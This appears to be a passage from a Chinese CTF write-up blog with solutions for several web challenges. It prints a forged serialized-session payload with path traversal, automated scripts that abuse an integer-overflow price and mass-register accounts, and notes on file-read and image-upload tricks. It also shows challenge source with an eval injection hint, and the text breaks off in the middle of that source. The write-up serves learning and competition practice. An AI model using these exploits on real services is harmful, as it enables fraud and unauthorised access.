+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//nickname = %s</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;a:4:&#123;s:10:&quot;session_id&quot;;s:32:&quot;3f65fc339c032f85048e42f21fab4ef0&quot;;s:10:&quot;ip_address&quot;;s:14:&quot;211.137.22.191&quot;;s:10:&quot;user_agent&quot;;s:78:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0&quot;;s:9:&quot;user_data&quot;;s:0:&quot;&quot;;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = unserialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Application</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="string">&#x27;....//config/flag.txt&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span> = <span class="string">&#x27;EzblrbNS&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>[<span class="string">&#x27;user_data&#x27;</span>] = <span class="keyword">new</span> Application;</span><br><span class="line"></span><br><span class="line"><span class="variable">$d</span> = serialize(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$d</span>.md5(<span class="variable">$key</span>.<span class="variable">$d</span>));</span><br></pre></td></tr></table></figure>
+<p>传参即可。</p>
+<h2 id="大吉大利今晚吃鸡"><a href="#大吉大利今晚吃鸡" class="headerlink" title="大吉大利今晚吃鸡"></a>大吉大利今晚吃鸡</h2><p>遇到买东西的题目首先思路就是改变价格，通过抓包发现价格可以往大改而不能往小改。可以利用整数溢出<code>0xffffffff+1</code>，传参进去就买到了。<br>然后要淘汰100个人，实际上要淘汰149个人。脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://117.51.147.155:5050&#x27;</span></span><br><span class="line">seq = [</span><br><span class="line">    <span class="string">&#x27;register&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;login&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;balance&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;search_ticket&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;bill&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;buy&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;bill&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;pay&#x27;</span>]</span><br><span class="line"></span><br><span class="line">url_seg = &#123;</span><br><span class="line">    <span class="string">&#x27;register&#x27;</span>:<span class="string">&#x27;/ctf/api/register?name=&#123;0&#125;&amp;password=11111111&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;login&#x27;</span>:<span class="string">&#x27;/ctf/api/login?name=&#123;0&#125;&amp;password=11111111&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;balance&#x27;</span>:<span class="string">&#x27;/ctf/api/get_user_balance&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;search_ticket&#x27;</span>:<span class="string">&#x27;/ctf/api/search_ticket&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;bill&#x27;</span>:<span class="string">&#x27;/ctf/api/search_bill_info&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;buy&#x27;</span>:<span class="string">&#x27;/ctf/api/buy_ticket?ticket_price=4294967296&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;remove&#x27;</span>:<span class="string">&#x27;/ctf/api/remove_robot?id=&#123;0&#125;&amp;ticket=&#123;1&#125;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;pay&#x27;</span>:<span class="string">&#x27;/ctf/api/pay_ticket?bill_id=&#123;0&#125;&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">victiom =&#123;</span><br><span class="line"> <span class="number">1</span>: <span class="string">&#x27;21cb23b38e33426812d68991dbb6ba68&#x27;</span>,</span><br><span class="line"> <span class="number">2</span>: <span class="string">&#x27;6f89be1e66c9bd69bce99952aa009a96&#x27;</span>,</span><br><span class="line"> <span class="number">3</span>: <span class="string">&#x27;70e1b0196609646efd0aacea613943d6&#x27;</span>,</span><br><span class="line"> <span class="number">4</span>: <span class="string">&#x27;46f7f7e50b54a636f3aae60dd839590b&#x27;</span>,</span><br><span class="line"> <span class="number">5</span>: <span class="string">&#x27;395b9fb4fb0f3cf42a727d43536be457&#x27;</span>,</span><br><span class="line"> ···</span><br><span class="line"> ···</span><br><span class="line"> <span class="number">147</span>: <span class="string">&#x27;4cc522f84f11189d9737ab18fc22fcd0&#x27;</span>,</span><br><span class="line"> <span class="number">148</span>: <span class="string">&#x27;8f2675372aa0f2ecfee1aeeee3d814cd&#x27;</span>,</span><br><span class="line"> <span class="number">149</span>: <span class="string">&#x27;7544b9ee45ae6ae7066305d472077638&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register_login_get_ticket</span>():</span></span><br><span class="line">    <span class="keyword">global</span> victiom </span><br><span class="line">    <span class="keyword">global</span> session</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        username = random.sample(string.letters, <span class="number">19</span>)    </span><br><span class="line">        username1 = <span class="string">&#x27;&#x27;</span>.join(username)</span><br><span class="line">        register1 = url_seg[<span class="string">&#x27;register&#x27;</span>].<span class="built_in">format</span>(<span class="built_in">str</span>(username1))</span><br><span class="line">        reg_url = url + register1</span><br><span class="line">        <span class="built_in">print</span> reg_url</span><br><span class="line">        res = session.get(reg_url).content</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;\u7528\u6237\u6ce8\u518c\u6210\u529f&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line">            log_url = url + url_seg[<span class="string">&#x27;login&#x27;</span>].<span class="built_in">format</span>(username1)</span><br><span class="line">            session.get(log_url)</span><br><span class="line">            buy_url = url + url_seg[<span class="string">&#x27;buy&#x27;</span>]</span><br><span class="line">            res = session.get(buy_url).content</span><br><span class="line">            bill_url = url + url_seg[<span class="string">&#x27;bill&#x27;</span>]</span><br><span class="line">            html = session.get(bill_url)</span><br><span class="line">            jsonn = json.loads(html.text)</span><br><span class="line">            bill_id = jsonn[<span class="string">&#x27;data&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;bill_id&#x27;</span>]</span><br><span class="line">            pay_url = url + url_seg[<span class="string">&#x27;pay&#x27;</span>].<span class="built_in">format</span>(bill_id)</span><br><span class="line">            session.get(pay_url)</span><br><span class="line">            sear_url = url + url_seg[<span class="string">&#x27;search_ticket&#x27;</span>]</span><br><span class="line">            html = session.get(sear_url)</span><br><span class="line">            res = html.content</span><br><span class="line">            josnn = json.loads(html.text)</span><br><span class="line">            <span class="built_in">id</span> = josnn[<span class="string">&#x27;data&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">            <span class="comment"># 这个地方有点奇怪，josn解析不出ticket所以采用正则匹配的方式</span></span><br><span class="line">            ticket = re.search(<span class="string">&quot;ticket\&quot;:\&quot;(.*?)\&quot;&quot;</span>, res).group(<span class="number">1</span>)</span><br><span class="line">            victiom[<span class="built_in">id</span>] = ticket</span><br><span class="line">            <span class="built_in">print</span> victiom</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(victiom) == <span class="number">149</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_other</span>():</span></span><br><span class="line">    session = requests.session()</span><br><span class="line">    regiter1  = url_seg[<span class="string">&#x27;register&#x27;</span>].<span class="built_in">format</span>(<span class="string">&#x27;ch5ser_cqw_cq&#x27;</span>)</span><br><span class="line">    reg_url = url + regiter1</span><br><span class="line">    res = session.get(reg_url).content</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;\u7528\u6237\u6ce8\u518c\u6210\u529f&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line">            log_url = url + url_seg[<span class="string">&#x27;login&#x27;</span>].<span class="built_in">format</span>(<span class="string">&#x27;ch5ser_cqw_cq&#x27;</span>)</span><br><span class="line">            session.get(log_url)</span><br><span class="line">            buy_url = url + url_seg[<span class="string">&#x27;buy&#x27;</span>]</span><br><span class="line">            res = session.get(buy_url).content</span><br><span class="line">            bill_url = url + url_seg[<span class="string">&#x27;bill&#x27;</span>]</span><br><span class="line">            html = session.get(bill_url)</span><br><span class="line">            jsonn = json.loads(html.text)</span><br><span class="line">            bill_id = jsonn[<span class="string">&#x27;data&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;bill_id&#x27;</span>]</span><br><span class="line">            pay_url = url + url_seg[<span class="string">&#x27;pay&#x27;</span>].<span class="built_in">format</span>(bill_id)</span><br><span class="line">            session.get(pay_url)</span><br><span class="line">            sear_url = url + url_seg[<span class="string">&#x27;search_ticket&#x27;</span>]</span><br><span class="line">            html = session.get(sear_url)</span><br><span class="line">            <span class="keyword">for</span> key, value <span class="keyword">in</span> victiom.items():    </span><br><span class="line">                remove = url_seg[<span class="string">&#x27;remove&#x27;</span>].<span class="built_in">format</span>(<span class="built_in">str</span>(key), value)</span><br><span class="line">                rem_url = url + remove</span><br><span class="line">                <span class="built_in">print</span> session.get(rem_url).content</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> session.get(<span class="string">&quot;http://117.51.147.155:5050/ctf/api/get_flag&quot;</span>).content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 注册过快可能会被封</span></span><br><span class="line">    register_login_get_ticket()</span><br><span class="line">    delete_other()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>学长的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">        url = <span class="string">&quot;http://117.51.147.155:5050/ctf/api/register?name=cic&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;&amp;password=12345678&quot;</span></span><br><span class="line">        html = requests.get(url)</span><br><span class="line">        <span class="built_in">print</span>(html.text)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ticket</span>(<span class="params">i</span>):</span></span><br><span class="line"></span><br><span class="line">        s = requests.session()</span><br><span class="line">        s.get(<span class="string">&quot;http://117.51.147.155:5050/ctf/api/login?name=cic&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;&amp;password=12345678&quot;</span>)</span><br><span class="line">        html = s.get(<span class="string">&quot;http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296&quot;</span>)</span><br><span class="line">        json1 = json.loads(html.text)</span><br><span class="line">        ticketid = json1[<span class="string">&quot;data&quot;</span>][<span class="number">0</span>][<span class="string">&quot;bill_id&quot;</span>]</span><br><span class="line">        html1 = s.get(<span class="string">&quot;http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=&quot;</span>+ticketid)</span><br><span class="line">        html2 = s.get(<span class="string">&quot;http://117.51.147.155:5050/ctf/api/search_ticket&quot;</span>)</span><br><span class="line">        json2 = json.loads(html2.text)</span><br><span class="line">        <span class="built_in">id</span> = json2[<span class="string">&quot;data&quot;</span>][<span class="number">0</span>][<span class="string">&quot;id&quot;</span>]</span><br><span class="line">        ticket = json2[<span class="string">&quot;data&quot;</span>][<span class="number">0</span>][<span class="string">&quot;ticket&quot;</span>]</span><br><span class="line"></span><br><span class="line">        pack = &#123;<span class="string">&quot;id&quot;</span>:<span class="built_in">id</span> , <span class="string">&quot;ticket&quot;</span>:ticket&#125;</span><br><span class="line">        <span class="keyword">return</span> pack</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_people</span>(<span class="params"><span class="built_in">id</span>,ticket</span>):</span></span><br><span class="line">    s = requests.session()</span><br><span class="line">    s.get(<span class="string">&quot;http://117.51.147.155:5050/ctf/api/login?name=cic&amp;password=12345678&quot;</span>)</span><br><span class="line">    html = s.get(<span class="string">&quot;http://117.51.147.155:5050/ctf/api/remove_robot?id=&quot;</span>+<span class="built_in">str</span>(<span class="built_in">id</span>)+<span class="string">&quot;&amp;ticket=&quot;</span>+ticket)</span><br><span class="line">    <span class="built_in">print</span>(html.text)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    reg()</span><br><span class="line">    <span class="comment">#get_ticket()</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">        pack = get_ticket(i)</span><br><span class="line">        <span class="built_in">id</span> = pack[<span class="string">&quot;id&quot;</span>]</span><br><span class="line">        ticket = pack[<span class="string">&quot;ticket&quot;</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">id</span>)</span><br><span class="line">        <span class="built_in">print</span>(ticket)</span><br><span class="line">        del_people(<span class="built_in">id</span>, ticket)</span><br><span class="line">        <span class="comment">#del_people(id,ticket)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="滴"><a href="#滴" class="headerlink" title="滴"></a>滴</h2><p>沙雕题目，要读取的文件<code>.practice.txt.swp</code>在线索网址的作者的另一篇博客中出现过，读取，获得源码，传递引用就可以了</p>
+<h2 id="图片上传"><a href="#图片上传" class="headerlink" title="图片上传"></a>图片上传</h2><p>上传一张图片，提示缺少字段<code>phpinfo()</code>,并显示出了上传后的图片，下载后放入<code>010editor</code>中比较发现文件被改动，比较发现特定位置上的字节并没有被改动，在该位置后面添加<code>phpinfo()</code>上传就有flag了。</p>
+<h2 id="homebrew-event-loop"><a href="#homebrew-event-loop" class="headerlink" title="homebrew event loop"></a>homebrew event loop</h2><p>read the source code first</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># written in python 3.7</span></span><br><span class="line">__author__ = <span class="string">&#x27;garzon&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, Response</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;*********************&#x27;</span> <span class="comment"># censored</span></span><br><span class="line">url_prefix = <span class="string">&#x27;/d5af31f66741e857&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;FLAG_is_here_but_i_wont_show_you&#x27;</span>  <span class="comment"># censored</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># put event in a queue</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span>(<span class="params">event</span>):</span></span><br><span class="line">    session[<span class="string">&#x27;log&#x27;</span>].append(event)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(session[<span class="string">&#x27;log&#x27;</span>]) &gt; <span class="number">5</span>: session[<span class="string">&#x27;log&#x27;</span>] = session[<span class="string">&#x27;log&#x27;</span>][-<span class="number">5</span>:]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(event) == <span class="built_in">type</span>([]):</span><br><span class="line">        request.event_queue += event</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        request.event_queue.append(event)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get the string between prefix and postfix</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span>(<span class="params">haystack, prefix, postfix=<span class="literal">None</span></span>):</span></span><br><span class="line">    haystack = haystack[haystack.find(prefix)+<span class="built_in">len</span>(prefix):]</span><br><span class="line">    <span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        haystack = haystack[:haystack.find(postfix)]</span><br><span class="line">    <span class="keyword">return</span> haystack</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RollBackException</span>:</span> <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span>():</span></span><br><span class="line">    valid_event_chars = <span class="built_in">set</span>(<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#x27;</span>)</span><br><span class="line">    resp = <span class="literal">None</span></span><br><span class="line">    <span class="comment"># handle a event everytime</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(request.event_queue) &gt; <span class="number">0</span>:</span><br><span class="line">        event = request.event_queue[<span class="number">0</span>] <span class="comment"># `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;</span></span><br><span class="line">        request.event_queue = request.event_queue[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">&#x27;action:&#x27;</span>, <span class="string">&#x27;func:&#x27;</span>)): <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> event:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars: <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            is_action = event[<span class="number">0</span>] == <span class="string">&#x27;a&#x27;</span></span><br><span class="line">            action = get_mid_str(event, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>)</span><br><span class="line">            args = get_mid_str(event, action+<span class="string">&#x27;;&#x27;</span>).split(<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># trigger_event%23;get_flag</span></span><br><span class="line">                <span class="comment"># 这个地方有意思，%23也就是井号是在拼接之后在eval的时候才触发的，而不是在拼接的时候立刻触发。而从下面来看，似乎井号的触发范围也封装在了event_handle里面了，而不会影响范围外的执行。</span></span><br><span class="line">                event_handler = <span class="built_in">eval</span>(action + (<span class="string">&#x27;_handler&#x27;</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">&#x27;_function&#x27;</span>))</span><br><span class="line">                ret_val = event_handler(args)</span><br><span class="line">            <span class="keyword">except</span> RollBackException:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;ERROR! All transactions have been cancelled. &lt;br /&gt;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">                session[<span class="string">&#x27;num_items&#x27;</span>] = request.prev_session[<span class="string">&#x27;num_items&#x27;</span>]</span><br><span class="line">                session[<span class="string">&#x27;points&#x27;</span>] = request.prev_session[<span class="string">&#x27;points&#x27;</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="comment">#resp += str(e) # only for debugging</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = ret_val</span><br><span class="line">                <span class="keyword">else</span>: resp += ret_val</span><br><span class="line">    <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">&#x27;&#x27;</span>: resp = (<span class="string">&#x27;404 NOT FOUND&#x27;</span>, <span class="number">404</span>)</span><br><span class="line">    session.modified = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params">url_prefix+<span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span>():</span></span><br><span class="line">    querystring = urllib.unquote(request.query_string)</span><br><span class="line">    request.event_queue = []</span><br><span class="line">    <span class="keyword">if</span> querystring == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">&#x27;action:&#x27;</span>)) <span class="keyword">or</span> <span class="built_in">len</span>(querystring) &gt; <span class="number">100</span>:</span><br><span class="line">        querystring = <span class="string">&#x27;action:index;False#False&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;num_items&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">&#x27;num_items&#x27;</span>] = <span class="number">0</span></span><br><span class="line">        session[<span class="string">&#x27;points&#x27;</span>] = <span class="number">3</span></span><br><span class="line">        session[<span class="string">&#x27;log&#x27;</span>] = []</span><br><span class="line">    request.prev_session = <span class="built_in">dict</span>(session)</span><br><span class="line">    trigger_event(querystring)</span><br><span class="line">    <span class="keyword">return</span> execute_event_loop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># handlers/functions below --------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    page = args[<span class="number">0</span>]</span><br><span class="line">    html = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    html += <span class="string">&#x27;[INFO] you have &#123;&#125; 